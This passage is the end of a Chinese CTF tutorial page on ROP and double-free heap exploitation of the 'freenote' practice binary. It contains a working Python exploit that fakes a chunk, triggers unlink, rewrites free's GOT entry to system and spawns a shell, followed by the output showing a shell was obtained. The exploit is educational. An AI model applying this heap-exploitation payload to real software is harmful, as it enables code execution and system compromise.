+ <p> 通过泄露的libc地址我们可以计算出 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code> 字符串在内存中的地址，通过泄露的堆的地址我们能得到note table的地址。然后我们构造一个假的note，利用使用double free的漏洞触发unlink，将note0的位置指向note table的地址。随后我们就可以通过编辑note0来编辑note table了。通过编辑note table我们把note0指向 <code>free()</code> 函数在got表中的地址，把note1指向 <code>&quot;/bin/sh&quot;</code> 在内存中的地址。然后我们编辑note0把 <code>free()</code> 函数在got表中的地址改为 <code>system()</code> 的地址。最后我们执行delete note1操作。因为我们把note1的地址指向了 <code>&quot;/bin/sh&quot;</code> ，所以正常情况下程序会执行 <code>free(&quot;/bin/sh&quot;)</code> ，但别忘了我们修改了got表中free的地址，所以程序会执行 <code>system(&quot;/bin/sh&quot;)</code> ，最终达到了我们的目的： </p> 
+ <pre class="prettyprint"><code>#!python
+fd = leakheapaddr - 0x1808 #notetable
+bk = fd + 0x8   
+
+payload  = &quot;&quot;
+payload += p64(0x0) + p64(notelen+1) + p64(fd) + p64(bk) + &quot;A&quot; * (notelen - 0x20)
+payload += p64(notelen) + p64(notelen+0x10) + &quot;A&quot; * notelen
+payload += p64(0) + p64(notelen+0x11)+ &quot;\x00&quot; * (notelen-0x20)  
+
+new_note(payload)   
+
+delete_note(1)  
+
+free_got = 0x602018 
+
+payload2 = p64(notelen) + p64(1) + p64(0x8) + p64(free_got) + &quot;A&quot;*16 + p64(binsh_addr)
+payload2 += &quot;A&quot;* (notelen*3-len(payload2))  
+
+edit_note(0, payload2)
+edit_note(0, p64(system_sh_addr))   
+
+delete_note(1)  
+
+p.interactive()
+</code></pre> 
+ <p>执行exp的结果如下：</p> 
+ <pre class="prettyprint"><code>$ python exp9.py 
+[+] Started program './freenote_x64'
+b8a75eb2b57f
+0x7fb5b25ea7b8
+system_sh_addr: 0x7fb5b2278310
+binsh_addr: 0x7fb5b23abfc7
+20684b02
+0x24b6820
+[*] Switching to interactive mode
+$ whoami
+mzheng
+</code></pre> 
+ <h2>0x04 总结</h2> 
+ <p>除了64位的freenote，blue-lotus还弄了一个32位版的freenote给大家练习。这些binary和exp都可以在我的github上下载到：</p> 
+ <p> <a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP" rel="nofollow,noindex">https://github.com/zhengmin1989/ROP_STEP_BY_STEP</a> </p> 
+ <p>另外，下篇我会带来arm上rop的利用，敬请期待。</p> 
+ <h2>0x05 参考资料</h2> 
+ <ol> 
+  <li> <a href="http://v0ids3curity.blogspot.com/2013/07/some-gadget-sequence-for-x8664-rop.html" rel="nofollow,noindex">http://v0ids3curity.blogspot.com/2013/07/some-gadget-sequence-for-x8664-rop.html</a> </li> 
+  <li>掘进CTF-杨坤</li> 
+ </ol> 
+</div>
+        </div>
+        <div class="article_social">
+         <div class="article_like">
+    <div class="circle circle-like" id="my_zan" data_id="IfYZri3">  </div>
+
+</div>
+        <div id="share_weixin_image">
+            <img width="100px" height="100px" src="http://s.jiathis.com/qrcode.php?url=http://www.tuicool.com/articles/IfYZri3?via=wechat_qr">
+        </div>
+<div class="article_share_fav">
+    <div class="share" id="ckepop">
+        <span>分享</span>
+        <button class="share_weibo" id="share_weibo_id"  title="分享到新浪微博"></button>
+        <button class="share_qq" id="share_qq_id"  title="分享到QQ空间"></button>
+        <button class="share_weixin" id="share_weixin_id"></button>
+    </div>
+    <div class="fav_correct">
+        <button id="my_fav" data_id="IfYZri3">
+            <i class="icon icon-star-empty"></i> <span id="fav_tip">收藏</span>
+        </button>
+        <button id="article-correct" data_id="IfYZri3" uid="462071652">
+            <i class="icon icon-warning-sign"></i>
+            <span>纠错</span>
+        </button>
+    </div>
+</div>
+<script type="text/javascript">
+$("#share_weibo_id").click( function() {
+   window.open("http://share.baidu.com/s?type=text&searchPic=0&sign=on&to=tsina&url=http://www.tuicool.com/articles/IfYZri3&title=%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Bgadgets%E5%92%8C2free%E7%AF%87++%28%E5%88%86%E4%BA%AB%E8%87%AA+%40%E6%8E%A8%E9%85%B7%E7%BD%91%29&key=3113829255");
+});
+$("#share_qq_id").click( function() {
+   window.open("http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.tuicool.com/articles/IfYZri3&title=%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Bgadgets%E5%92%8C2free%E7%AF%87&desc=&summary=&site=");
+});
+$("#share_weixin_id").click( function() {
+  $("#share_weixin_image").toggle();
+});
+</script>
+
+
+        </div>
+        <div id="site_articles" style="clear:both;">
+              <div class="article-part-title">
+                <span>推荐文章</span>
+              </div>
+          <ul class="side_article_list">
+                <li class="side_article_list_item">
+                    1.<a href="/articles/vEvmYv2" target="_blank" title="掌握这17个tar命令实例让你秒变大牛">
+                    掌握这17个tar命令实例让你秒变大牛
+                    </a>
+                </li>
+                <li class="side_article_list_item">
+                    2.<a href="/articles/JfUniia" target="_blank" title="实例详解 Linux 中的 fork() 函数">
+                    实例详解 Linux 中的 fork() 函数
+                    </a>
+                </li>
+                <li class="side_article_list_item">
+                    3.<a href="/articles/InMBnyr" target="_blank" title="每日一博 | 关于 CPU 亲和性的测试">
+                    每日一博 | 关于 CPU 亲和性的测试
+                    </a>
+                </li>
+                <li class="side_article_list_item">
+                    4.<a href="/articles/NbieYrz" target="_blank" title="SIGKILL信号linux下kill进程 -9">
+                    SIGKILL信号linux下kill进程 -9
+                    </a>
+                </li>
+                <li class="side_article_list_item">
+                    5.<a href="/articles/j6Bfuqv" target="_blank" title="堡垒跳板机实现——架构实现">
+                    堡垒跳板机实现——架构实现
+                    </a>
+                </li>
+                <li class="side_article_list_item">
+                    6.<a href="/articles/FNjAvab" target="_blank" title="ELF文件格式分析">
+                    ELF文件格式分析
+                    </a>
+                </li>
+          </ul>
+        </div>
+        <div id="kan_articles"></div>
+        <div id="article_weibo" style="display:none;">
+            <div class='article-part-title'>
+                <span>相关微博</span>
+                <sub>
+                    <a href="/articles/weibo_list/IfYZri3" target="_blank">(<i id="weibo_num"></i>)</a> 
+               </sub>
+            </div>
+            <div class="related-weibo-list"></div>
+        </div>
+        <div class="comments">
+    <div class="comments-area">
+    <div class="comments-header">
+        <h5>我来评几句</h5>
+        <div class="alert comment-alert alert-error" style="display:none;">
+            错误
+        </div>
+           <textarea name="comment[body]" id="comment-body" cols="60" rows="6" placeholder="请输入评论内容..." style="resize: none;"></textarea>
+           <a href="javascript:commentsub();" class="btn btn-medium btn-submit" id="comment-submit">发表评论</a>
+        <p style="margin-top: 5px;margin-left:10px;">
+            已发表评论数(<span class="comment_cnt"></span>)
+        </p>
+    </div>
+    <div class="comments-list">
+        <div class="empty-cmts alert alert-success" style="display:none;">
+            没有更多评论了^^
+        </div>
+    </div>
+    <div class="more-comments" style="display:none;">
+        <a href="">更多评论</a>
+    </div>
+    <div class="load-fail">
+        评论加载失败，<a href="javascript:reload_comments('IfYZri3',1,0,1);">重新加载</a>
+        <img src="http://static1.tuicool.com//images/spinner.gif" id="spinner3"/>
+    </div>
+    </div>
+</div>
+
+    </div>
+        <div class="span4 article_right_side">
+            <div class="article_related_site article_detail_bg">
+    <h4 class="article-part-title">相关站点</h4>
+    <div class="article_related_site_body clearfix">
+        <div class="logo">
+            <img src="http://stimg2.tuicool.com/a2UJrq.png"/>
+        </div>
+        <div class="name">
+            <div>
+                <a href="/sites/a2UJrq" target="_blank"> WooYun知识库</a>
+            </div>
+            <div>
+                <div class="btn right_site_follow" >已订阅</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="right_site_articles" class="article_detail_bg">
+    <div class="article-part-title">
+        <span>热门文章</span>
+    </div>
+    <ul class="side_article_list">
+        <li class="side_article_list_item">
+            1.<a href="/articles/vEvmYv2" target="_blank" title="掌握这17个tar命令实例让你秒变大牛"> 掌握这17个tar命令实例让你秒变大牛 </a>
+        </li>
+        <li class="side_article_list_item">
+            2.<a href="/articles/JfUniia" target="_blank" title="实例详解 Linux 中的 fork() 函数"> 实例详解 Linux 中的 fork() 函数 </a>
+        </li>
+        <li class="side_article_list_item">
+            3.<a href="/articles/InMBnyr" target="_blank" title="每日一博 | 关于 CPU 亲和性的测试"> 每日一博 | 关于 CPU 亲和性的测试 </a>
+        </li>
+        <li class="side_article_list_item">
+            4.<a href="/articles/NbieYrz" target="_blank" title="SIGKILL信号linux下kill进程 -9"> SIGKILL信号linux下kill进程 -9 </a>
+        </li>
+        <li class="side_article_list_item">
+            5.<a href="/articles/Z3UBvm6" target="_blank" title="GPG 密鑰的「正確」用法"> GPG 密鑰的「正確」用法 </a>
+        </li>
+    </ul>
+</div>
+<div class="right-link">
+      <a href="https://www.teambition.com/?utm_source=tuicool&utm_medium=banner01" target="_blank"><img src="http://static2.tuicool.com/images/upload/teambition120.jpg"/></a>
+
+</div>
+<div class="right-link" style="margin-top: 5px">
+      <a href="https://www.jiandaoyun.com/?f=tc" target="_blank"><img src="http://static0.tuicool.com/images/upload/jiandaoyun120.jpg"/></a>
+
+</div>
+<div class="right-link" style="margin-top: 5px">
+      <a href="http://click.aliyun.com/m/6128/" target="_blank"><img src="http://static1.tuicool.com/images/upload/aliyun120.jpg"/></a>
+
+</div>
+<div class="right-link" style="margin-top: 0px">
+      <a href="http://www.toushibao.com/landing.html?utm_source=tuicoolwenzhang&utm_medium=guanggao&utm_campaign=tuicoolwenzhang.guanggao.tsbxgn" target="_blank"><img src="http://static1.tuicool.com/images/upload/jiankongbao120.jpg"/></a>
+
+</div>
+<div class="right-link" style="margin-top: 5px">
+      <a href="http://www.handone.com/?f=tc" target="_blank"><img src="http://static1.tuicool.com/images/upload/handone300.jpg"/></a>
+
+</div>
+<div class="right-link" style="margin-top: 5px">
+      <a href="https://www.daocloud.io/cloud/voice.html?utm_source=tuicool&utm_medium=banner%20&utm_campaign=daovoicecampaign" target="_blank"><img src="http://static1.tuicool.com/images/upload/daocloud300.jpg"/></a>
+
+</div>
+<div class="right-link" style="margin-top: 5px">
+      <a href="https://www.jiguang.cn/devservice/?from=tuicool01" target="_blank"><img src="http://static1.tuicool.com/images/upload/jpush120.jpg"/></a>
+
+</div>
+<div class="frd_pos">
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:inline-block;width:300px;height:250px"
+     data-ad-client="ca-pub-7054762349007490"
+     data-ad-slot="5705695566"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+</div>
+
+         </div>
+</div>
+
+<div>
+   <!-- add_article to kan -->
+<div id="add-article-to-kan" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-header">
+    <span class="add-title">收藏到推刊</span>
+    <a href="#new-kan" class="btn pull-right" data-toggle="modal">创建推刊</a>
+    <i class="clearfix"></i>
+  </div>
+  <div class="modal-body">
+    <ul id="add-kan-list">
+    </ul>
+  </div>
+  <div class="modal-footer">
+    <input type="hidden" value="IfYZri3" class="article-id" /> 
+    <button class="btn btn-primary pull-left add-to-btn">  收 藏  </button>
+    <button class="btn" data-dismiss="modal" aria-hidden="true" style="margin-right: 15px">取消</button>
+  </div>
+</div>
+
+   <div id="new-kan" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-body">
+    <input type="text" name="name" id="new-kan-name"  placeholder="推刊名(必填)" required data-validation-required-message="请填写推刊名" />
+    <span class="new-ness-name">请填写推刊名</span>
+    <br/>
+    <textarea name="desc" id="desc" rows="6" placeholder="推刊描述"></textarea>
+    <span class="new-ness-desc">描述不能大于100个字符!</span>
+    <br/>
+    权限设置：<input type="radio" name="type" value="1" checked="checked" /> 公开
+    <input type="radio" name="type" value="0"> 仅自己可见
+  </div>
+  <div class="modal-footer">
+    <button class="btn btn-primary pull-left create-kan-btn" disabled>创建</button>
+    <button class="btn dismiss-new-kan" data-dismiss="modal" aria-hidden="true">取消</button>
+  </div>
+</div>
+
+
+</div>
+<div id="article-correct-modal" class="modal hide fade in" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false">
+    <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">
+            &times;
+        </button>
+        <h3>文章纠错</h3>
+    </div>
+    <div class="modal-body">
+        <input type="hidden" value="IfYZri3" id="article-correct-source">
+        <div>
+            <label for="article-correct-select">
+                错误类型
+            </label>
+            <select id="article-correct-select">
+                <option value="正文不准确">正文不准确</option>
+                <option value="标题不准确">标题不准确</option>
+                <option value="排版有问题">排版有问题</option>
+                <option value="排版有问题">主题不准确</option>
+                <option value="没有分页内容">没有分页内容</option>
+                <option value="图片无法显示">图片无法显示</option>
+                <option value="视频无法显示">视频无法显示</option>
+                <option value="与原文不一致">与原文不一致</option>
+            </select>
+        </div>
+        <div>
+            <label for="article-correct-other">
+                补充信息
+            </label>
+            <textarea id="article-correct-other" class="span4"></textarea>
+        </div>
+    </div>
+    <div class="modal-footer">
+        <button class="btn btn-primary pull-right huodong_correct_submit" id="article-correct-submit">
+            &nbsp;&nbsp;提交&nbsp;&nbsp;
+        </button>
+    </div>
+</div>
+    <div class="share_zone">
+    <div class="bdsharebuttonbox"> 
+         <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+        <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+        <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+        <a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"></a>
+        <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+        <a href="#" class="bds_more" data-cmd="more"></a>
+     </div>
+    <script>
+        window._bd_share_config = {
+            "common" : {
+                "bdSnsKey" : {
+                    "tsina" : "3113829255",
+                    "tqq" : "801536792"
+                },
+                "bdText" : "一步一步学ROP之gadgets和2free篇 (分享自 @推酷网)",
+                "bdMini" : "2",
+                "bdMiniList" : false,
+                "bdPic" : "http://aimg0.tuicool.com/UveQze.jpg",
+                "bdStyle" : "1",
+                "bdSize" : "24"
+            },
+            "slide" : {
+                "type" : "slide",
+                "bdImg" : "1",
+                "bdPos" : "left",
+                "bdTop" : "200"
+            }
+        };
+        with (document)
+        0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];
+    </script>
+</div>
+
+<style type="text/css">
+    .btn-large {
+        padding: 0;
+    }
+    .load-fail {
+        display: none;
+    }
+</style>
+<script src="http://static1.tuicool.com//assets/highlight.pack.js"></script>
+<script type="text/javascript">
+    $('table').each(function(i) {
+        var size = $(this).children().size();
+        if (size > 1) {
+            $(this).attr('class',"table table-bordered");
+        } else if (size == 1) {
+            var e11 = $(this).children(":first");
+            var e1 = e11[0];
+            var name = e1.nodeName.toLowerCase();
+            if ("tbody" == name) {
+                if (e1.children.length > 1) {
+                    $(this).attr('class',"table table-bordered");
+                } else if (e1.children.length == 1){
+                    var e12 = e1.children[0];
+                    var name2 = e12.nodeName.toLowerCase();
+                    if ("tr" == name2) {
+                       if (e12.children.length > 1) {
+                         $(this).attr('class',"table table-bordered");
+                       }
+                    }
+                }
+            }
+        }
+    });
+            related_kan("IfYZri3");
+        window.page = 0;
+        window.last = 0;    
+        window.first = true;
+        resize_article_image('#nei', 550);
+                load_comments("IfYZri3",1,0,"MTU1Nzky+cefc514b570d92b90ea1fd1a5e720fa78d2ca451");
+                window.uid = parseInt("155792");
+        open_add_article_to_kan("true");
+        async_do_zan_article(); 
+        $('pre').each(function(i, e) {
+            hljs.highlightBlock(e, "<span class='indent'>  </span>", false)
+        });
+       
+          function commentsub(){  
+    $.ajaxSetup({
+    error:function(x,e){        
+      $('.comment-alert').text("系统出现问题，请稍候再试").show();
+      $('textarea').attr('disabled',false);
+      return false;
+    },
+    headers: {
+      'X-CSRF-Token': $('meta[name="csrf-token"]').attr('content')
+    }
+  }); 
+    $("#comment-body").attr("disabled",true);
+    $("#comment-submit").addClass("disabled");
+    $("#comment-submit").attr("href","#comment-body");
+    text = $("#comment-body").val();
+    if(text.length < 2 ){
+        $('.comment-alert').text("你的字数太少了").show();
+        reset_submit_btn();
+    }else if(text.length > 500){
+        $('.comment-alert').text("你的字数太多了,不能超过500字!").show();
+        reset_submit_btn();
+    }else{      
+    $.post("/comments.json", { aid: "IfYZri3", html_body: $("#comment-body").val(), auth: "MTU1Nzky+cefc514b570d92b90ea1fd1a5e720fa78d2ca451"},function(data){
+      if(data.success == true){
+        $(".comments-list").show();
+        var aComment = data.comment;
+        var text = aComment.content;
+        var id = "IfYZri3";
+        var title = "一步一步学ROP之gadgets和2free篇";
+        var share_code = "<ul class='dropdown-menu'><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=tsina&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>新浪微博</a></li><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=tqq&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @tuicool）'>腾讯微博</a></li><li><a target='blank' href='http://s.evernote.com/grclip?url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>印象笔记</a></li><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=douban&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>豆瓣</a></li><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=renren&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>人人网</a></li></ul>"
+        $(".comments-list").prepend("<div class='single' id='c-"+aComment.id+"'><img src='"+aComment.avatar+"' class='img avatar'><div class='comment-item' style='padding:0 0 0 5px;'><div class='info mine'>"+"<a class='uname' href='/user/"+ aComment.uid+ "' target='_blank'>"+ aComment.username  +"</a>" +"<span class='timestamp'>" +aComment.timestamp +"</span> <div class='reply dropdown'><a class='dropdown-toggle share' data-toggle='dropdown' href='javascript:share("+aComment.id+");'>分享<b class='caret'></b></a> | <a href='javascript:reply(\""+aComment.username+"\");'>回复</a>"+share_code+"</div> "+ "</div><div class='body' id='comment-"+aComment.id+"'>" + aComment.content + "</div></div></div>");
+        $("#comment-body").attr("disabled",false).val("");
+        $("#comment-submit").removeClass("disabled");
+        $("#comment-submit").attr("href","javascript:commentsub();");
+        location = "#c-"+aComment.id
+        $('.empty-cmts').hide();
+        $('.comment-alert').hide();
+        $('.comment_cnt').text(parseInt($('.comment_cnt').text())+1);
+       } else{
+        $('.comment-alert').text(data.error).show();
+        reset_submit_btn();
+       }
+    },"json");
+    }
+}
+function reset_submit_btn() {
+  $('textarea').attr('disabled',false);
+  $("#comment-submit").removeClass("disabled");
+  $("#comment-submit").attr("href","javascript:commentsub();");
+}
+
+       handle_follow_site("#my_follow","已订阅","+ 订阅");
+</script>
+
+
+    <div class="loader-inner ball-pulse ball-loading-center" id="page-loading" style="display: none">
+      <div></div>
+      <div></div>
+      <div></div>
+    </div>
+    <div class="read-later-alert"></div>
+  </div>
+
+    <div class="footer">
+    <div class="footer-inner">
+    <dl class="about-link site-link">
+        <dt>
+            网站相关
+        </dt>
+        <dd>
+            <a target="_blank" href="http://www.tuicool.com/about">关于我们</a>
+        </dd>
+        <dd>
+            <a target="_blank" href="http://www.tuicool.com/mobile">移动应用</a>
+        </dd>
+        <dd>
+            <a target="_blank" href="http://www.tuicool.com/bbs/go/issues">建议反馈</a>
+        </dd>
+    </dl>
+    <dl class="site-link follow-link">
+        <dt>
+            关注我们
+        </dt>
+        <dd>
+            <a target="_blank" href="http://e.weibo.com/tuicool2012"><img src="http://static1.tuicool.com/images/weibo-32.png">推酷网</a>
+        </dd>
+        <dd><img src="http://static1.tuicool.com/images/weixin-32.png">tuicool2012
+        </dd>
+    </dl>
+    <dl class="site-link links">
+        <dt>
+            友情链接
+        </dt>
+        <dd>
+                <a href="http://www.woshipm.com/" title="人人都是产品经理" target="_blank">人人都是产品经理</a>
+                <a href="http://www.pm265.com/" title="PM256" target="_blank">PM256</a>
+                <a href="http://www.yidonghua.com/" title="移动信息化" target="_blank">移动信息化</a>
+                <a href="http://www.snsiu.com/" title="行晓网" target="_blank">行晓网</a>
+                <a href="http://www.taskcity.com/" title="智城外包网" target="_blank">智城外包网</a>
+                <a href="http://www.huxiu.com/" title="虎嗅" target="_blank">虎嗅</a>
+                <a href="http://www.iterduo.com/" title="IT耳朵" target="_blank">IT耳朵</a>
+                <a href="http://mediaworks.caixin.com/" title="创媒工场" target="_blank">创媒工场</a>
+                <a href="http://www.managershare.com/" title="经理人分享" target="_blank">经理人分享</a>
+                <a href="http://www.shichangbu.com/" title="市场部网" target="_blank">市场部网</a>
+                <a href="http://www.ikanchai.com/" title="砍柴网" target="_blank">砍柴网</a>
+                <a href="http://www.cocoachina.com/" title="CocoaChina" target="_blank">CocoaChina</a>
+                <a href="http://www.ibeifeng.com/" title="北风网" target="_blank">北风网</a>
+                <a href="http://www.jiankongbao.com/" title="云智慧" target="_blank">云智慧</a>
+                <a href="http://www.wyzc.com" title="我赢职场" target="_blank">我赢职场</a>
+                <a href="http://www.thebigdata.cn/" title="大数据时代" target="_blank">大数据时代</a>
+                <a href="http://www.qidic.com/" title="奇笛网" target="_blank">奇笛网</a>
+                <a href="http://www.cngulu.com/" title="咕噜网" target="_blank">咕噜网</a>
+                <a href="http://www.linuxdiyf.com/" title="红联linux" target="_blank">红联linux</a>
+                <a href="http://win10.ithome.com" title="Win10之家" target="_blank">Win10之家</a>
+                <a href="http://www.niaogebiji.com/" title="鸟哥笔记" target="_blank">鸟哥笔记</a>
+                <a href="http://www.play.cn" title="爱游戏" target="_blank">爱游戏</a>
+                <a href="http://www.investide.cn/" title="投资潮" target="_blank">投资潮</a>
+                <a href="http://www.31huiyi.com/" title="31会议网" target="_blank">31会议网</a>
+                <a href="https://www.jiguang.cn/" title="极光推送" target="_blank">极光推送</a>
+                <a href="https://www.teambition.com/" title="Teambition" target="_blank">Teambition</a>
+                <a href="http://www.guigu.org/" title="硅谷网" target="_blank">硅谷网</a>
+                <a href="https://home.leangoo.com/" title="leangoo" target="_blank">leangoo</a>
+                <a href="http://www.zealer.com/" title="ZEALER中国" target="_blank">ZEALER中国</a>
+                <a href="http://www.opensns.cn/" title="OpenSNS" target="_blank">OpenSNS</a>
+                <a href="http://www.edu360.cn/" title="小牛学堂" target="_blank">小牛学堂</a>
+                <a href="http://www.handone.com/" title="handone" target="_blank">handone</a>
+                <a href="http://www.scrumcn.com/" title="Scrum中文网" target="_blank">Scrum中文网</a>
+                <a href="http://www.bigniu.com/" title="比戈大牛" target="_blank">比戈大牛</a>
+                <a href="https://www.upyun.com/" title="又拍云" target="_blank">又拍云</a>
+            <a href="/links">更多链接>></a>&nbsp;&nbsp;
+        </dd>
+    </dl>
+    <div class="clear"></div>
+    </div>
+</div>
+
+<div style="display:none;">
+   <script src="http://s22.cnzz.com/stat.php?id=5541078&web_id=5541078&show=pic" language="JavaScript"></script>
+</div>
+
+
+</body>
+</html>
